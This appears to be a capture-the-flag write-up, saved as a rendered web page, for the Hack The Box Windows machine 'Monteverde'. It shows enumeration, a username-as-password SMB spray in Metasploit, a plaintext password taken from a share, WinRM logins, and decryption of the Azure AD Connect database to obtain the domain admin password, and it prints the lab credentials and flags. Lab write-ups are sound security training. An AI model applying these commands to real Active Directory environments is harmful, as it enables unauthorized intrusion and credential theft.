@@ -1,0 +1,160 @@
+I"*<p><strong><center>Ref°: HTB-08-Boot2Root</center></strong></p>
+
+<p><img src="/assets/images/monteverde/HTB-Badge-Monteverde.png" alt="Desktop View" /></p>
+
+<p>— Monteverde is a Windows machine that highlights the weakness of a password (lazy password) after a first enumeration and the presence of a password in the SMB service to get our flag user.</p>
+
+<p>A privilege escalation is possible when our user is in Azure Admins security group to perform an attack through AD Azure Connect service to get flag root.</p>
+
+<p><img src="/assets/images/monteverde/HTB-Information-Monteverde.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+<p>We find interesting services <code class="language-plaintext highlighter-rouge">dns</code>, <code class="language-plaintext highlighter-rouge">kerberos</code>, <code class="language-plaintext highlighter-rouge">ldap</code> and <code class="language-plaintext highlighter-rouge">smb</code> on their usual ports.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.172 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<h3 id="enumerate-samba-service-from-enum4linux">Enumerate Samba service from enum4linux</h3>
+<hr />
+<p>Enum4linux is a tool for enumerating information from Windows and Samba systems.</p>
+
+<p>We find users : <code class="language-plaintext highlighter-rouge">Administrator, Guest, AAD_987d7f2f57d2, mhope, SABatchJobs, svc-ata, svc-bexec, svc-netapp, dgalanos, roleary, smorgan</code></p>
+
+<p>And interesting group Azure Admins with 3 members.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>enum4linux 10.10.10.172
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+.......
+Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
+Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
+Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
+</code></pre></div></div>
+
+<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="using-lazy-password">Using Lazy Password</h3>
+<hr />
+
+<p>We have much possitiblity to exploit Active-Directory Machine.</p>
+
+<p>Reference - Active-Directory exploit toolbox : <a href="https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md">https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md</a></p>
+
+<p>But longer enumeration and kerberos attack give me nothing. In this situation we’re gonna try <code class="language-plaintext highlighter-rouge">lazy passwords</code>.</p>
+
+<p>Let’s see with smb_login module in Metasploit and set true the <code class="language-plaintext highlighter-rouge">USER_AS_PASS</code>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfconsole
+<span class="gp">msf5 &gt;</span><span class="w"> </span>search smb_login
+<span class="gp">msf5 &gt;</span><span class="w"> </span>use auxiliary/scanner/smb/smb_login
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>SMBDomain MEGABANK.LOCAL
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>USER_FILE /root/Documents/writeups/monteverde/userfile.txt
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>USER_AS_PASS <span class="nb">true</span>
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span><span class="nb">set </span>rhosts 10.10.10.172
+<span class="gp">msf5 auxiliary(scanner/smb/smb_login) &gt;</span><span class="w"> </span>exploit
+</code></pre></div></div>
+<p>Result : <code class="language-plaintext highlighter-rouge">Success: 'megabank.local\SABatchJobs:SABatchJobs'</code></p>
+
+<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="plaintext-password-from-conf-file">Plaintext Password from conf file</h3>
+<hr />
+
+<p>We enum with SABatchJobs on smb service.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>smbmap <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> SABatchJobs <span class="nt">-H</span> 10.10.10.172
+<span class="gp">$</span><span class="w"> </span>mount <span class="nt">-t</span> cifs //10.10.10.172/users<span class="nv">$ </span>share_users <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>SABatchJobs,password<span class="o">=</span>SABatchJobs
+</code></pre></div></div>
+
+<p>We find file in user folder <code class="language-plaintext highlighter-rouge">azure.xml</code> with a plaintext password : <code class="language-plaintext highlighter-rouge">4n0therD4y@n0th3r$</code>
+This xml seems to be created by azure cmdlet to create password for the user mhope with -AsPlainText attribut.</p>
+
+<p><img src="/assets/images/monteverde/HTB-Images-Monteverde-PasswordMhope.png" alt="Desktop View" /></p>
+
+<h3 id="remote-service-winrm-login">Remote Service WinRM login</h3>
+<hr />
+
+<p>We can connect now with evil-winrm tool. This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985).</p>
+
+<p>WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.</p>
+
+<p>Reference - evil-winrm tool : <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.10.172 <span class="nt">-u</span> mhope <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>
+</code></pre></div></div>
+
+<h3 id="flag-user">Flag user</h3>
+<hr />
+
+<p>We flag the user to validate the compromission of the system user.</p>
+
+<p>Result the flag : 4961976bd7d8f4eeb2ce3705e2f212f2</p>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="azure-adconnect-database-exploitation">Azure ADConnect Database exploitation</h3>
+<hr />
+
+<p>We identified an interesting group at the beginning Azure Admins.
+Here our user Mhope belongs to this group : Global Group Memberships Azure Admins</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS c:\Users\mhope\Documents&gt;</span><span class="w"> </span>net <span class="nb">users </span>mhope
+</code></pre></div></div>
+
+<p>After research to find any exploit through group Azure Admins, i finally found the exploitation to compromise Monteverde Machine through the database of Azure ADConnect Service.</p>
+
+<p>Reference - exploit : <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a></p>
+
+<p>Azure AD Connect is the service installed within the Active Directory environment. It is responsible for syncing and communicating with Azure AD and is what the majority of this post will focus on.</p>
+
+<p>From mhope user we have the ability to extract credential of the account (with the necessary right to perform DCSync Attack) which served during the installation of Azure AD Connect through the decryption of the value encrypted_configuration in the database ADSync.</p>
+
+<p>To do this we use the script of a hackthebox player made available on github : <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1">https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1</a></p>
+
+<p>This script is based on the POC created by XPN but with a modification in the ArgumentList to pass when we execute it.
+The script then becomes more flexibility.</p>
+
+<p>The decrypted password for the account which served during the installation of Azure AD Connect will be revealed : <code class="language-plaintext highlighter-rouge">d0m@in4dminyeah!</code></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\mhope\Documents&gt;</span><span class="w"> </span>menu
+<span class="gp">PS C:\Users\mhope\Documents&gt;</span><span class="w"> </span>Azure-ADConnect <span class="nt">-server</span> 10.10.10.172 <span class="nt">-db</span> ADSYNC
+</code></pre></div></div>
+<p>Result :
+[+] Domain:  MEGABANK.LOCAL
+[+] Username: administrator
+[+]Password: d0m@in4dminyeah!</p>
+
+<h3 id="remote-service-winrm-login-1">Remote Service WinRM login</h3>
+<hr />
+
+<p>Here the account is administrator, so we dont need to perform DCSync Attack.</p>
+
+<p>We can connect with evil winrm and grab the flag root to valide the compromission of the mahine.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.10.172 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'d0m@in4dminyeah!'</span>
+</code></pre></div></div>
+
+<h3 id="flag-root">Flag root</h3>
+<hr />
+
+<p>Result : 12909612d25c8dcf6e5a07d1a804a0bc</p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>They might call it the cloud but it is, in fact, just someone else’s computer.</strong></p>
+
+  <p>Mark Russinovich</p>
+</blockquote>
+:ET
